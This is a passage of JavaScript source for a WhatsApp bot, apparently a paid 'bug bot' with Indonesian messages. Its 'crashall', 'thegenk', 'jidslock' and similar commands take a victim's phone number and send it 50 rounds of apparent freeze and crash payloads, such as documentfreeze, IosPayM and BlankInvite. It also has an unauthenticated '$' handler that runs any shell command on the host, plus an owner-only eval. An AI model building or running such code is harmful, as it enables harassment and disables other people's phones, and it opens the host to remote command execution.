await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze2(target, wanted)
}
break
//===================================
case 'thegenk': 
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await VPen(target, wanted)
await uidoc(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
}
break
//===================================
case 'fuckyou': case '🔥':
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await StuckNull(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await ClPmNull(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
}
break;
//===================================
case 'crashall': case '🤫':
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await StuckNull(target, wanted)
await VPen(target, wanted)
await locasiV2(target, wanted)
await IosPayM(target, wanted)
await BlankInvite(target, wanted)
await IosStanza(target, wanted)
await documentfreeze2(target, wanted)
await uidoc2(target, wanted)
await IosCL(target, wanted)
await ClPmNull(target, wanted)
}
break;
//===================================
case 'jidslock': case '👽': 
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await documentfreeze(target, wanted)
await StuckNull(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await ClPmNull(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
}
break;
//===================================
case 'addowner': case 'addown':
if (!isOwner) return reply(language.onlyown)
if (!args[0]) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
dikaown = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await dikabot.onWhatsApp(dikaown + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(language.invalid)
ownerNumber.push(dikaown)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘪𝘦 𝘥𝘪 𝘬𝘢𝘴𝘪𝘩 𝘢𝘬𝘴𝘦𝘴 𝘰𝘸𝘯𝘦𝘳 _${dikaown}_*`)
break
//===================================
case 'delowner': case 'delown':
if (!isOwner) return reply(language.onlyown)
if (!args[0]) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
dikaown = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘞𝘬𝘸𝘬 𝘥𝘪 𝘥𝘦𝘭𝘦𝘵𝘦 𝘢𝘬𝘴𝘦𝘴 𝘰𝘸𝘯𝘦𝘳 _${dikaown}_*`)
break
//===================================
case 'addpremium': case 'addprem': {
if (!isOwner) return reply(language.onlyown)
if (!args[0]) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
dikaprem = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await dikabot.onWhatsApp(dikaprem)
if (ceknya.length == 0) return reply(language.invalid)
prem.push(dikaprem)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘪𝘦 𝘥𝘪 𝘬𝘢𝘴𝘪𝘩 𝘢𝘬𝘴𝘦𝘴 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 _${dikaprem}_*`)
}
break
//===================================
case 'delpremium': case 'delprem': {
if (!isOwner) return reply(language.onlyown)
if (!args[0]) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
dikaprem = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘞𝘬𝘸𝘬 𝘥𝘪 𝘥𝘦𝘭𝘦𝘵𝘦 𝘢𝘬𝘴𝘦𝘴 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 _${dikaprem}_*`)
}
break
//===================================
case 'self': {
if (!isOwner) return reply(language.onlyown)
dikabot.public = false
reply(language.succes)
}
break
//===================================
case 'public': {
if (!isOwner) return reply(language.onlyown)
dikabot.public = true
reply(language.succes)
}
break
//===================================
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply('DikaNihBos')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
dikabot.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})